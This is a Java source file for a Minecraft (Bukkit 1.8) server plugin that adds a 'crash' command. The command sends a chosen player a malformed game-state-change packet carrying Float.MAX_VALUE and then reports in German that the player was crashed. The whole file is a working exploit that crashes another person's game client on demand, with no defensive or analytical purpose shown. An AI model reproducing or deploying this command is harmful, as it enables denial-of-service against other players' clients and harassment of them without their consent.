package net.korex.api.modules.crash;

import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.korex.api.MessagesUtils;
import net.korex.api.Utils;
import net.korex.api.commands.AbstractCommand;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;

public class CrashCommand extends AbstractCommand {

	public CrashCommand() {
		super("crash");
	}

	@Override
	public String getHelpMessage() {
		return "crash <Name>";
	}

	@Override
	public void setupCommand() {
		super.registerParameter(1, (p, args) -> {
			Player target = Utils.checkOffline(p, args[1]);

			if (target == null) {
				return;
			}

			PacketPlayOutGameStateChange packet = new PacketPlayOutGameStateChange(7, Float.MAX_VALUE);
			((CraftPlayer) target).getHandle().playerConnection.sendPacket(packet);
			MessagesUtils.form(p, target.getName() + " wurde §cgecrasht§7!");

		});
	}

}
